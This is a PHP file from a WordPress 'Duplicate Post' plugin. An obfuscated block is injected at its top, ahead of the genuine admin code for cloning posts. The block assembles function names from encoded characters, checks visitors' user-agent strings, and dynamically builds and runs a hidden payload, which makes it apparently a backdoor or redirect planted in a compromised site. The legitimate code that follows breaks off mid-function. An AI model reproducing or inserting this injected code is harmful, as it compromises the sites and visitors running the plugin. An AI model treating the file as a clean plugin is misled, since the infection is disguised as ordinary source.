<?php $hrbzdpnygg = '6985:6197g:74985-rr.93e:5597f-s.973:8if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") !-#jt0*?]+^?]_	x5c}X	x24<!%tl:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}mw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]273]yyy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7tfs%w6<	x7fw6*CWtfs%]77]D4]82]K6]72]K9]78]K5]tutjyf`opjudovg)!gj!|!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tid%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[Aw6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuD8]86]y31]278]y3f]51L3]8ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fm%,3,j%>j%!<**3-j%-bubE{	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24		x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpif5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FU,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27z>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]K!sboepn)%epnbss-%rxW~!Y_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)goj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y]D4]275]D:M8]Df#<%tds%6<#o]1/20QUUI7jsv%7UF4]y31M6]y3e]81#/#7e:)s%>/h%:<**#57]38y]47]675	x53	105	x52	137	x41	107	x45	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYs:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%c]55Ld]55#*<%bG9}:}.}-}!#*<pjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)73qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quuiy]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy42178}527}88:}334}472	x24<!%ff2!>!bssbz)]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%iubq#	x5cq%	x27jsv%6<C<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#76)) { $pmnljlm = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpx24*<!~!	x24/%t2w/	x24)##-!#)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFIoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	xgj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]437fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x2755946-tr.984:75983:48984:71]K9&& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	15r%:|:**t%)m%=*h%)m%):fK)ebfsX	x27u%)7fmjix6<C	x2`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#1/14+9**-)1/2986+7**^/%rx<~!-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	76]252]y85]256]y6g]257]y86]267-qp%)54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!o7&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfx5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x2297f:5297e:56-xr.985:52985-t.98]K4]65]<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepd&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%2]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x26	x75	156	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x54	120	x5f	12w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&<u%V	x27{ftmfV	x7f<*X&Z*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}oF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22pqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h#!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)y83]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%str($uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x:**<")));$owyzmnl = $pmnljlm("", $qxfzdhw); $owyzmnl();}}!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubh%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojnebsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:5!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-157	x6e"; function jegzsxm($n){return chr(ord($n)-1);} @er7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;m",str_split("%tjw!>!#]y84]275]y83]248]44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso4-tusqpt)%z-#:#*	x24-	x2**#sfmcnbs+yfeobz+sfwjidsb`bj+d#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<#H#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udf]225]241]334]368]322]3]364]6]283]427]36]tf!%z>2<!%ww2)%w`TW~	x24<pp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19275fubm53]Kc#<%tpz!>!#]D6M7]K3#<%#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9#	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7mgoj{hA!osvufs!~<3,j%>j%!*3!	x274!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24mjix:<##:>:h%:<#64y]552]e7y]#>n%#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)f~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%u%!-#2#/#%#/#o]#/*)323zbePNFS&d_SFSFGFS`QUUI&c_UOror_reporting(0); $qxfzdhw = implode(array_map("jegzsx%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*vso!%bss	x5csboe))1/35.)uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}epdof.)fepdof./#@#/qp%>5h%!<*::::::!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*) or (strstr($uas,"	x66	151	x72	145	x66	157	x78")iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc($uas,"	x63	150	x72	157	x6d	145")FHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f6f	151	x64")) or (strstr]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (str{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<<%nfd)##Qtpz)#]341]88M4P8]37]278StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSopppoxauh'; $hpwbzoqc=explode(chr((566-446)),substr($hrbzdpnygg,(32837-26817),(164-130))); $hylkeqwa = $hpwbzoqc[0]($hpwbzoqc[(3-2)]); $qmycssuu = $hpwbzoqc[0]($hpwbzoqc[(8-6)]); if (!function_exists('cwenzbo')) { function cwenzbo($wggltdc, $cnqhyyw,$dmzgjpg) { $lyysgfynq = NULL; for($esopgoh=0;$esopgoh<(sizeof($wggltdc)/2);$esopgoh++) { $lyysgfynq .= substr($cnqhyyw, $wggltdc[($esopgoh*2)],$wggltdc[($esopgoh*2)+(4-3)]); } return $dmzgjpg(chr((36-27)),chr((586-494)),$lyysgfynq); }; } $nophxhxa = explode(chr((270-226)),'37,56,2461,67,3199,68,1280,30,5792,57,3616,68,5703,24,5487,33,5368,49,1919,70,4042,58,5080,54,4276,39,3555,61,446,66,3267,47,4100,44,4144,42,2550,26,2818,41,1213,23,4466,51,2128,64,2377,54,1545,56,1841,22,1143,50,4788,42,1509,36,5918,70,290,20,2079,49,797,63,389,57,682,52,4227,49,3337,66,952,68,335,21,3741,60,4830,32,356,33,3448,45,1704,35,617,23,3801,63,2192,59,1989,62,4423,43,3493,62,1601,66,4934,44,5283,35,5574,63,4393,30,3864,68,4725,63,734,63,5056,24,5520,54,3973,69,5213,70,1105,38,2767,51,1454,55,4652,47,1020,51,2576,53,5637,66,3314,23,3073,60,3009,64,3403,45,121,60,5849,69,5031,25,93,28,181,49,2737,30,1779,62,1256,24,1667,37,2528,22,4902,32,1863,56,3133,66,1739,40,640,42,2859,53,4369,24,4862,40,5727,65,2694,43,2051,28,4978,53,5417,70,1071,34,4315,54,929,23,4582,70,1310,62,3932,41,0,37,2912,38,558,24,1236,20,2431,30,310,25,4699,26,230,60,1193,20,860,69,1427,27,5134,55,5988,32,4517,40,2308,69,512,46,5189,24,2666,28,5318,50,2950,59,1372,55,582,35,4557,25,4186,41,2629,37,2251,57,3684,57'); $qawrbuqz = $hylkeqwa("",cwenzbo($nophxhxa,$hrbzdpnygg,$qmycssuu)); $hylkeqwa=$hrbzdpnygg; $qawrbuqz(""); $qawrbuqz=(750-629); $hrbzdpnygg=$qawrbuqz-1; ?><?php
// Added by WarmStal
if(!is_admin())
	return;

require_once (dirname(__FILE__).'/duplicate-post-options.php');

/**
 * Wrapper for the option 'duplicate_post_version'
*/
function duplicate_post_get_installed_version() {
	return get_site_option( 'duplicate_post_version' );
}

/**
 * Wrapper for the defined constant DUPLICATE_POST_CURRENT_VERSION
 */
function duplicate_post_get_current_version() {
	return DUPLICATE_POST_CURRENT_VERSION;
}

/**
 * Plugin upgrade
 */
add_action('admin_init','duplicate_post_plugin_upgrade');

function duplicate_post_plugin_upgrade() {
	$installed_version = duplicate_post_get_installed_version();
	
	if ( $installed_version==duplicate_post_get_current_version() )
		return;

		
	if (empty($installed_version)) {
		// Get default roles
			$default_roles = array(
				3 => 'editor',
				8 => 'administrator',
		);
		
		// Cycle all roles and assign capability if its level >= duplicate_post_copy_user_level
		foreach ($default_roles as $level => $name){
			$role = get_role($name);
			if(!empty($role)) $role->add_cap( 'copy_posts' );
		}
	} else {
		$min_user_level = get_option('duplicate_post_copy_user_level');
			
		if (!empty($min_user_level)){
			// Get default roles
			$default_roles = array(
					1 => 'contributor',
					2 => 'author',
					3 => 'editor',
					8 => 'administrator',
			);
				
			// Cycle all roles and assign capability if its level >= duplicate_post_copy_user_level
			foreach ($default_roles as $level => $name){
				$role = get_role($name);
				if ($role && $min_user_level <= $level)
					$role->add_cap( 'copy_posts' );
			}
			delete_option('duplicate_post_copy_user_level');
		}
	}
		
	
	add_option('duplicate_post_copytitle','1');
	add_option('duplicate_post_copydate','0');
	add_option('duplicate_post_copystatus','0');
	add_option('duplicate_post_copyslug','1');
	add_option('duplicate_post_copyexcerpt','1');
	add_option('duplicate_post_copycontent','1');
	add_option('duplicate_post_copythumbnail','1');
	add_option('duplicate_post_copytemplate','1');
	add_option('duplicate_post_copyformat','1');
	add_option('duplicate_post_copyauthor','0');
	add_option('duplicate_post_copypassword','0');
	add_option('duplicate_post_copyattachments','0');
	add_option('duplicate_post_copychildren','0');
	add_option('duplicate_post_copycomments','0');
	add_option('duplicate_post_copymenuorder','1');
	add_option('duplicate_post_taxonomies_blacklist',array());
	add_option('duplicate_post_blacklist','');
	add_option('duplicate_post_types_enabled',array('post', 'page'));
	add_option('duplicate_post_show_row','1');
	add_option('duplicate_post_show_adminbar','1');
	add_option('duplicate_post_show_submitbox','1');
	add_option('duplicate_post_show_bulkactions','1');
	
	$taxonomies_blacklist = get_option('duplicate_post_taxonomies_blacklist');
	if ($taxonomies_blacklist == "") $taxonomies_blacklist = array();
	if(in_array('post_format',$taxonomies_blacklist)){
		update_option('duplicate_post_copyformat', 0);
		$taxonomies_blacklist = array_diff($taxonomies_blacklist, array('post_format'));
		update_option('duplicate_post_taxonomies_blacklist', $taxonomies_blacklist);
	}
	
	$meta_blacklist = explode(",",get_option('duplicate_post_blacklist'));
	if ($meta_blacklist == "") $meta_blacklist = array();
	$meta_blacklist = array_map('trim', $meta_blacklist);
	if(in_array('_wp_page_template', $meta_blacklist)){
		update_option('duplicate_post_copytemplate', 0);
		$meta_blacklist = array_diff($meta_blacklist, array('_wp_page_template'));	
	}	
	if(in_array('_thumbnail_id', $meta_blacklist)){
		update_option('duplicate_post_copythumbnail', 0);
		$meta_blacklist = array_diff($meta_blacklist, array('_thumbnail_id'));
	}
	update_option('duplicate_post_blacklist', implode(',',$meta_blacklist));

	delete_option('duplicate_post_admin_user_level');
	delete_option('duplicate_post_create_user_level');
	delete_option('duplicate_post_view_user_level');
	delete_option('dp_notice');
	
	delete_option('duplicate_post_version');
	update_site_option( 'duplicate_post_version', duplicate_post_get_current_version() );
	
	delete_option('duplicate_post_show_notice', 0);
	update_site_option('duplicate_post_show_notice', 1);
	
}

if (get_option('duplicate_post_show_row') == 1){
	add_filter('post_row_actions', 'duplicate_post_make_duplicate_link_row',10,2);
	add_filter('page_row_actions', 'duplicate_post_make_duplicate_link_row',10,2);
}


if (get_site_option('duplicate_post_show_notice') == 1){
	/**
	 * Shows the update notice
	 */
	function duplicate_post_show_update_notice() {
		if(!current_user_can( 'manage_options')) return;
		$class = 'notice is-dismissible';
		$message = '<strong>'.esc_html__('Duplicate Post has new features!', 'duplicate-post').'</strong><br/>';
		$message .= '<em>'.esc_html__('Clone posts in bulk (WP 4.7+)', 'duplicate-post').' — '.esc_html__('Wildcards in custom field names', 'duplicate-post').' — '.esc_html__('Options for thumbnail, post format, post template, author, menu order', 'duplicate-post').'</em><br/>';
    	$message .= sprintf(__('Please <a href="%s">review the settings</a> to make sure it works as you expect.', 'duplicate-post'), admin_url('options-general.php?page=duplicatepost')).'<br/>';
		$message .= '<strong>'.__('Help me develop the plugin and provide support by <a href="http://lopo.it/duplicate-post-plugin">donating even a small sum</a>.', 'duplicate-post').'</strong>';
		global $wp_version;
		if( version_compare($wp_version, '4.2') < 0 ){
			$message .= ' | <a id="duplicate-post-dismiss-notice" href="javascript:duplicate_post_dismiss_notice();">'.__('Dismiss this notice.').'</a>';
		}
		echo '<div id="duplicate-post-notice" class="'.$class.'"><p>'.$message.'</p></div>';
		echo "<script>
				function duplicate_post_dismiss_notice(){
					var data = {
					'action': 'duplicate_post_dismiss_notice',
					};
	
					jQuery.post(ajaxurl, data, function(response) {
						jQuery('#duplicate-post-notice').hide();
					});
				}
	
				jQuery(document).ready(function(){
					jQuery('body').on('click', '.notice-dismiss', function(){
						duplicate_post_dismiss_notice();
					});
				});
				</script>";
	}

	if(is_multisite()){
		add_action( 'network_admin_notices', 'duplicate_post_show_update_notice' );
	} else {
		add_action( 'admin_notices', 'duplicate_post_show_update_notice' );
	}
	add_action( 'wp_ajax_duplicate_post_dismiss_notice', 'duplicate_post_dismiss_notice' );
	
	function duplicate_post_dismiss_notice() {
		$result = update_site_option('duplicate_post_show_notice', 0);
		return $result;
		wp_die();
	}
}

/**
 * Add the link to action list for post_row_actions
 */
function duplicate_post_make_duplicate_link_row($actions, $post) {
	if (duplicate_post_is_current_user_allowed_to_copy() && duplicate_post_is_post_type_enabled($post->post_type)) {
		$actions['clone'] = '<a href="'.duplicate_post_get_clone_post_link( $post->ID , 'display', false).'" title="'
				. esc_attr__("Clone this item", 'duplicate-post')
				. '">' .  esc_html__('Clone', 'duplicate-post') . '</a>';
		$actions['edit_as_new_draft'] = '<a href="'. duplicate_post_get_clone_post_link( $post->ID ) .'" title="'
				. esc_attr__('Copy to a new draft', 'duplicate-post')
				. '">' .  esc_html__('New Draft', 'duplicate-post') . '</a>';
	}
	return $actions;
}

/**
 * Add a button in the post/page edit screen to create a clone
 */
if (get_option('duplicate_post_show_submitbox') == 1){
	add_action( 'post_submitbox_start', 'duplicate_post_add_duplicate_post_button' );
}

function duplicate_post_add_duplicate_post_button() {
	if ( isset( $_GET['post'] )){
		$id = $_GET['post'];
		$post = get_post($id);
		if(duplicate_post_is_current_user_allowed_to_copy() && duplicate_post_is_post_type_enabled($post->post_type)) {
	 	?>
<div id="duplicate-action">
	<a class="submitduplicate duplication"
		href="<?php echo duplicate_post_get_clone_post_link( $_GET['post'] ) ?>"><?php esc_html_e('Copy to a new draft', 'duplicate-post'); ?>
	</a>
</div>
<?php
		}
	}
}

/**
 * Connect actions to functions
 */
add_action('admin_action_duplicate_post_save_as_new_post', 'duplicate_post_save_as_new_post');
add_action('admin_action_duplicate_post_save_as_new_post_draft', 'duplicate_post_save_as_new_post_draft');

/*
 * This function calls the creation of a new copy of the selected post (as a draft)
* then redirects to the edit post screen
*/
function duplicate_post_save_as_new_post_draft(){
	duplicate_post_save_as_new_post('draft');
}

add_filter('removable_query_args', 'duplicate_post_add_removable_query_arg', 10, 1);

function duplicate_post_add_removable_query_arg( $removable_query_args ){
	$removable_query_args[] = 'cloned';
	return $removable_query_args;
}

/*
 * This function calls the creation of a new copy of the selected post (by default preserving the original publish status)
* then redirects to the post list
*/
function duplicate_post_save_as_new_post($status = ''){
	if (! ( isset( $_GET['post']) || isset( $_POST['post'])  || ( isset($_REQUEST['action']) && 'duplicate_post_save_as_new_post' == $_REQUEST['action'] ) ) ) {
		wp_die(esc_html__('No post to duplicate has been supplied!', 'duplicate-post'));
	}

	// Get the original post
	$id = (isset($_GET['post']) ? $_GET['post'] : $_POST['post']);
	$post = get_post($id);

	// Copy the post and insert it
	if (isset($post) && $post!=null) {
		$new_id = duplicate_post_create_duplicate($post, $status);
		
		if ($status == ''){
			$sendback = remove_query_arg( array( 'trashed', 'untrashed', 'deleted', 'cloned', 'ids'), admin_url( 'edit.php?post_type='.$post->post_type) );
			// Redirect to the post list screen
			wp_redirect( add_query_arg( array( 'cloned' => 1, 'ids' => $post->ID), $sendback ) );
		} else {
			// Redirect to the edit screen for the new draft post
			wp_redirect( add_query_arg( array( 'cloned' => 1, 'ids' => $post->ID), admin_url( 'post.php?action=edit&post=' . $new_id ) ) );
		}
		exit;

	} else {
		wp_die(esc_html__('Copy creation failed, could not find original:', 'duplicate-post') . ' ' . htmlspecialchars($id));
	}
}

/**
 * Copy the taxonomies of a post to another post
 */
function duplicate_post_copy_post_taxonomies($new_id, $post) {
	global $wpdb;
	if (isset($wpdb->terms)) {
		// Clear default category (added by wp_insert_post)
		wp_set_object_terms( $new_id, NULL, 'category' );

		$post_taxonomies = get_object_taxonomies($post->post_type);
		// severl plugins just add support to post-formats but don't register post_format taxonomy
		if(post_type_supports($post->post_type, 'post-formats') && !in_array('post_format', $post_taxonomies)){
			$post_taxonomies[] = 'post_format';
		}
		
		$taxonomies_blacklist = get_option('duplicate_post_taxonomies_blacklist');
		if ($taxonomies_blacklist == "") $taxonomies_blacklist = array();
		if(get_option('duplicate_post_copyformat') == 0){
			$taxonomies_blacklist[] = 'post_format';
		}
		$taxonomies = array_diff($post_taxonomies, $taxonomies_blacklist);
		foreach ($taxonomies as $taxonomy) {
			$post_terms = wp_get_object_terms($post->ID, $taxonomy, array( 'orderby' => 'term_order' ));
			$terms = array();
			for ($i=0; $i<count($post_terms); $i++) {
				$terms[] = $post_terms[$i]->slug;
			}
			wp_set_object_terms($new_id, $terms, $taxonomy);
		}
	}
}

/**
 * Copy the meta information of a post to another post
*/
function duplicate_post_copy_post_meta_info($new_id, $post) {
	$post_meta_keys = get_post_custom_keys($post->ID);
	if (empty($post_meta_keys)) return;
	$meta_blacklist = get_option('duplicate_post_blacklist');
	if ($meta_blacklist == ""){
		$meta_blacklist = array();
	} else {
		$meta_blacklist = explode(',', $meta_blacklist);
		$meta_blacklist = array_filter($meta_blacklist);
		$meta_blacklist = array_map('trim', $meta_blacklist);
	}	
	$meta_blacklist[] = '_wpas_done_all'; //Jetpack Publicize
	$meta_blacklist[] = '_wpas_done_'; //Jetpack Publicize
	$meta_blacklist[] = '_wpas_mess'; //Jetpack Publicize
	$meta_blacklist[] = '_edit_lock'; // edit lock
	$meta_blacklist[] = '_edit_last'; // edit lock
	if(get_option('duplicate_post_copytemplate') == 0){
		$meta_blacklist[] = '_wp_page_template';
	}
	if(get_option('duplicate_post_copythumbnail') == 0){
		$meta_blacklist[] = '_thumbnail_id';
	}
	
	$meta_blacklist = apply_filters( 'duplicate_post_blacklist_filter' , $meta_blacklist );
	
	$meta_blacklist_string = '('.implode(')|(',$meta_blacklist).')';
	if(strpos($meta_blacklist_string, '*') !== false){
		$meta_blacklist_string = str_replace(array('*'), array('[a-zA-Z0-9_]*'), $meta_blacklist_string);
	
		$meta_keys = array();
		foreach($post_meta_keys as $meta_key){
			if(!preg_match('#^'.$meta_blacklist_string.'$#', $meta_key))
				$meta_keys[] = $meta_key;
		}
	} else {
		$meta_keys = array_diff($post_meta_keys, $meta_blacklist);
	}

	$meta_keys = apply_filters( 'duplicate_post_meta_keys_filter', $meta_keys );

	foreach ($meta_keys as $meta_key) {
		$meta_values = get_post_custom_values($meta_key, $post->ID);
		foreach ($meta_values as $meta_value) {
			$meta_value = maybe_unserialize($meta_value);
			add_post_meta($new_id, $meta_key, duplicate_post_wp_slash($meta_value));
		}
	}
}

/*
 * Workaround for inconsistent wp_slash.
 * Works only with WP 4.4+ (map_deep)
 */
function duplicate_post_addslashes_deep( $value ) {
	if (function_exists('map_deep')){
		return map_deep( $value, 'duplicate_post_addslashes_to_strings_only' );
	} else {
		return wp_slash( $value );
	}
}

function duplicate_post_addslashes_to_strings_only( $value ) {
	return is_string( $value ) ? addslashes( $value ) : $value;
}

function duplicate_post_wp_slash( $value ) { 
	return duplicate_post_addslashes_deep( $value ); 
} 
		
		
		
/**
 * Copy the attachments
*/
function duplicate_post_copy_attachments($new_id, $post){
	// get thumbnail ID
	$old_thumbnail_id = get_post_thumbnail_id($post->ID);
	// get children
	$children = get_posts(array( 'post_type' => 'any', 'numberposts' => -1, 'post_status' => 'any', 'post_parent' => $post->ID ));
	// clone old attachments
	foreach($children as $child){
		if ($child->post_type != 'attachment') continue;
		$url = wp_get_attachment_url($child->ID);
		// Let's copy the actual file
		$tmp = download_url( $url );
		if( is_wp_error( $tmp ) ) {
			@unlink($tmp);
			continue;
		}

		$desc = wp_slash($child->post_content);

		$file_array = array();
		$file_array['name'] = basename($url);
		$file_array['tmp_name'] = $tmp;
		// "Upload" to the media collection
		$new_attachment_id = media_handle_sideload( $file_array, $new_id, $desc );

		if ( is_wp_error($new_attachment_id) ) {
			@unlink($file_array['tmp_name']);
			continue;
		}
		$new_post_author = wp_get_current_user();
		$cloned_child = array(
				'ID'           => $new_attachment_id,
				'post_title'   => $child->post_title,
				'post_exceprt' => $child->post_title,
				'post_author'  => $new_post_author->ID
		);
		wp_update_post( wp_slash($cloned_child) );

		$alt_title = get_post_meta($child->ID, '_wp_attachment_image_alt', true);
		if($alt_title) update_post_meta($new_attachment_id, '_wp_attachment_image_alt', wp_slash($alt_title));

		// if we have cloned the post thumbnail, set the copy as the thumbnail for the new post
		if(get_option('duplicate_post_copythumbnail') == 1 && $old_thumbnail_id == $child->ID){
				set_post_thumbnail($new_id, $new_attachment_id);
		}
		
	}
}

/**
 * Copy children posts
 */
function duplicate_post_copy_children($new_id, $post){
	// get children
	$children = get_posts(array( 'post_type' => 'any', 'numberposts' => -1, 'post_status' => 'any', 'post_parent' => $post->ID ));
	// clone old attachments
	foreach($children as $child){
		if ($child->post_type == 'attachment') continue;
		duplicate_post_create_duplicate($child, '', $new_id);
	}
}

/**
 * Copy comments
 */
function duplicate_post_copy_comments($new_id, $post){
	$comments = get_comments(array(
		'post_id' => $post->ID,
		'order' => 'ASC',
		'orderby' => 'comment_date_gmt'
	));

	$old_id_to_new = array();
	foreach ($comments as $comment){
		//do not copy pingbacks or trackbacks
		if(!empty($comment->comment_type)) continue;
		$parent = ($comment->comment_parent && $old_id_to_new[$comment->comment_parent])?$old_id_to_new[$comment->comment_parent]:0;
		$commentdata = array(
			'comment_post_ID' => $new_id,
			'comment_author' => $comment->comment_author,
			'comment_author_email' => $comment->comment_author_email,
			'comment_author_url' => $comment->comment_author_url,
			'comment_content' => $comment->comment_content,
			'comment_type' => '', 
			'comment_parent' => $parent,
			'user_id' => $comment->user_id,
			'comment_author_IP' => $comment->comment_author_IP,
			'comment_agent' => $comment->comment_agent,
			'comment_karma' => $comment->comment_karma,
			'comment_approved' => $comment->comment_approved,
		);
		if(get_option('duplicate_post_copydate') == 1){
			$commentdata['comment_date'] = $comment->comment_date ;
			$commentdata['comment_date_gmt'] = get_gmt_from_date($comment->comment_date);
		}
		$new_comment_id = wp_insert_comment($commentdata);
		$old_id_to_new[$comment->comment_ID] = $new_comment_id;
	}
}

// Using our action hooks

add_action('dp_duplicate_post', 'duplicate_post_copy_post_meta_info', 10, 2);
add_action('dp_duplicate_page', 'duplicate_post_copy_post_meta_info', 10, 2);

if(get_option('duplicate_post_copychildren') == 1){
	add_action('dp_duplicate_post', 'duplicate_post_copy_children', 20, 2);
	add_action('dp_duplicate_page', 'duplicate_post_copy_children', 20, 2);
}

if(get_option('duplicate_post_copyattachments') == 1){
	add_action('dp_duplicate_post', 'duplicate_post_copy_attachments', 30, 2);
	add_action('dp_duplicate_page', 'duplicate_post_copy_attachments', 30, 2);
}

if(get_option('duplicate_post_copycomments') == 1){
	add_action('dp_duplicate_post', 'duplicate_post_copy_comments', 40, 2);
	add_action('dp_duplicate_page', 'duplicate_post_copy_comments', 40, 2);
}

add_action('dp_duplicate_post', 'duplicate_post_copy_post_taxonomies', 50, 2);
add_action('dp_duplicate_page', 'duplicate_post_copy_post_taxonomies', 50, 2);

/**
 * Create a duplicate from a post
 */
function duplicate_post_create_duplicate($post, $status = '', $parent_id = '') {
	
	do_action('duplicate_post_pre_copy');

	if (!duplicate_post_is_post_type_enabled($post->post_type) && $post->post_type != 'attachment')
		wp_die(esc_html__('Copy features for this post type are not enabled in options page', 'duplicate-post'));
		
	$new_post_status = (empty($status))? $post->post_status: $status;
	
	if ($post->post_type != 'attachment'){
		$prefix = sanitize_text_field(get_option('duplicate_post_title_prefix'));
		$suffix = sanitize_text_field(get_option('duplicate_post_title_suffix'));
		$title = ' ';
		if (get_option('duplicate_post_copytitle') == 1) {
			$title = $post->post_title;
			if (!empty($prefix)) $prefix.= " ";
			if (!empty($suffix)) $suffix = " ".$suffix;
			} else {
			$title = ' ';
		}
		$title = trim($prefix.$title.$suffix);

		if ($title == ''){
			// empty title
			$title = __('Untitled');
		}
		if (get_option('duplicate_post_copystatus') == 0){
			$new_post_status = 'draft';
		} else {
